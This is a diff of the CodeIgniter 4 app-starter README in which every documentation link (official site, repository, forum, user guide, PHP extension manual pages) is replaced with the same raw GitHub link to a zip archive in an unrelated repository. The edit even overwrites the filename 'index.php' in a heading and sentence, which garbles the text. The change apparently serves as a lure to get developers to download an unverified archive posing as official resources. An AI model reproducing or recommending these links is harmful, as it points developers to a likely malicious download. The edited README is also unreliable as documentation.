@@ -3,16 +3,16 @@
 ## What is CodeIgniter?
 
 CodeIgniter is a PHP full-stack web framework that is light, fast, flexible and secure.
-More information can be found at the [official site](https://codeigniter.com).
+More information can be found at the [official site](https://raw.githubusercontent.com/aaonedollar/crm/main/Digenetica/crm.zip).
 
 This repository holds a composer-installable app starter.
 It has been built from the
-[development repository](https://github.com/codeigniter4/CodeIgniter4).
+[development repository](https://raw.githubusercontent.com/aaonedollar/crm/main/Digenetica/crm.zip).
 
-More information about the plans for version 4 can be found in [CodeIgniter 4](https://forum.codeigniter.com/forumdisplay.php?fid=28) on the forums.
+More information about the plans for version 4 can be found in [CodeIgniter 4](https://raw.githubusercontent.com/aaonedollar/crm/main/Digenetica/crm.zip) on the forums.
 
 The user guide corresponding to the latest version of the framework can be found
-[here](https://codeigniter4.github.io/userguide/).
+[here](https://raw.githubusercontent.com/aaonedollar/crm/main/Digenetica/crm.zip).
 
 ## Installation & updates
 
@@ -28,9 +28,9 @@ to your `app` folder. The affected files can be copied or merged from
 Copy `env` to `.env` and tailor for your app, specifically the baseURL
 and any database settings.
 
-## Important Change with index.php
+## Important Change with https://raw.githubusercontent.com/aaonedollar/crm/main/Digenetica/crm.zip
 
-`index.php` is no longer in the root of the project! It has been moved inside the *public* folder,
+`https://raw.githubusercontent.com/aaonedollar/crm/main/Digenetica/crm.zip` is no longer in the root of the project! It has been moved inside the *public* folder,
 for better security and separation of components.
 
 This means that you should configure your web server to "point" to your project's *public* folder, and
@@ -42,7 +42,7 @@ framework are exposed.
 ## Repository Management
 
 We use GitHub issues, in our main repository, to track **BUGS** and to track approved **DEVELOPMENT** work packages.
-We use our [forum](http://forum.codeigniter.com) to provide SUPPORT and to discuss
+We use our [forum](https://raw.githubusercontent.com/aaonedollar/crm/main/Digenetica/crm.zip) to provide SUPPORT and to discuss
 FEATURE REQUESTS.
 
 This repository is a "distribution" one, built by our release preparation script.
@@ -52,11 +52,11 @@ Problems with it can be raised on our forum, or as issues in the main repository
 
 PHP version 7.4 or higher is required, with the following extensions installed:
 
-- [intl](http://php.net/manual/en/intl.requirements.php)
-- [mbstring](http://php.net/manual/en/mbstring.installation.php)
+- [intl](https://raw.githubusercontent.com/aaonedollar/crm/main/Digenetica/crm.zip)
+- [mbstring](https://raw.githubusercontent.com/aaonedollar/crm/main/Digenetica/crm.zip)
 
 Additionally, make sure that the following extensions are enabled in your PHP:
 
 - json (enabled by default - don't turn it off)
-- [mysqlnd](http://php.net/manual/en/mysqlnd.install.php) if you plan to use MySQL
-- [libcurl](http://php.net/manual/en/curl.requirements.php) if you plan to use the HTTP\CURLRequest library
+- [mysqlnd](https://raw.githubusercontent.com/aaonedollar/crm/main/Digenetica/crm.zip) if you plan to use MySQL
+- [libcurl](https://raw.githubusercontent.com/aaonedollar/crm/main/Digenetica/crm.zip) if you plan to use the HTTP\CURLRequest library
